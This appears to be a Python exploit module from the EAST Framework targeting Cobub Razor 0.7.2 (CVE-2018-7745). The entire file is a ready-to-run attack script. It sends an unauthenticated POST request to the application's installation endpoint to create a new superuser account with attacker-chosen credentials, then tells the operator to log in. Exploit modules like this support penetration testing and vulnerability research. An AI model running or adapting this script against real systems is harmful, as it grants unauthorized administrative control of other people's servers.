#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib
import urllib2

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_cobub_razor_pe"
INFO['DESCRIPTION'] = "Cobub Razor 0.7.2 - Add New Superuser Account"
INFO['VENDOR'] = "https://github.com/cobub/razor/"
INFO['DOWNLOAD_LINK'] = 'https://github.com/cobub/razor/'
INFO['LINKS'] = ['https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7745', 'https://www.exploit-db.com/exploits/44419/']
INFO["CVE Name"] = "CVE-2018-7745"
INFO["NOTES"] = """Authentication is not required for requests, resulting in account creation. 
"""

INFO['CHANGELOG'] = "09 Apr, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = "80", dict(description = 'Target port')
OPTIONS["BASEPATH"] = "/razor/web", dict(description = 'Basepath of Razor')

OPTIONS["NEW USERNAME"] = 'admin2', dict(description = 'New admin username')
OPTIONS["NEW PASSWORD"] = 'password2', dict(description = 'New admin password')
OPTIONS["NEW EMAIL"] = 'aaa@aaa.bbb', dict(description = 'New admin e-mail')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.username = ''
        self.password = ''
        self.basepath = ''
        self.email = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.username = self.args.get('NEW USERNAME')
        self.password = self.args.get('NEW PASSWORD')
        self.email = self.args.get('NEW EMAIL')
        self.basepath = self.args.get('BASEPATH')
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        data = {}
        data['siteurl'] = self.make_url('/')
        data['superuser'] = self.username
        data['pwd'] = self.password
        data['verifypassword'] = self.password
        data['email'] = self.email
        data['submit'] = 'Submit request'
        url = self.make_url('/index.php?/install/installation/createuserinfo')
        
        try:
            fd = urllib2.urlopen(url, urllib.urlencode(data))
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('All done. Now, try to login with your credentials!')
        
        self.finish(True)
      
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
